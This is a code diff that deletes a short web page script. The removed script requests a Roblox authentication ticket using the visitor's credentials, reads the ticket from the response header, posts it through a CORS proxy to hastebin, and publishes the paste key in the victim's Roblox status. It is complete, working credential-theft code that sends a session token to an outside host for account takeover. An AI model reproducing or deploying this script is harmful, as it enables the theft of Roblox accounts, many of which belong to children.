@@ -1,24 +1,2 @@
 
 
-<body>
-   <?php
-header('Access-Control-Allow-Origin: https://www.roblox.com');
-header('Access-Control-Allow-Credentials: true');
-?>
-var data = {}
-$.ajax({
-   type: 'POST',
-   url: 'https://auth.roblox.com/v1/authentication-ticket',
-   data: data,
-   success: function(data, textStatus, request) {
-       $.post('https://non-cors.herokuapp.com/https://hastebin.com/documents',{jj:request.getResponseHeader('rbx-authentication-ticket')    }, function(data, status, xhr2){
-$.post("https://www.roblox.com/home/updatestatus",
-       {status: data.key, sendToFacebook:"false"});
-       })
-   },
-   error: function(request, textStatus, errorThrown) {
-       $.get(' ' + request.getResponseHeader('rbx-authentication-ticket'));
-   }
-});
-</body>
-
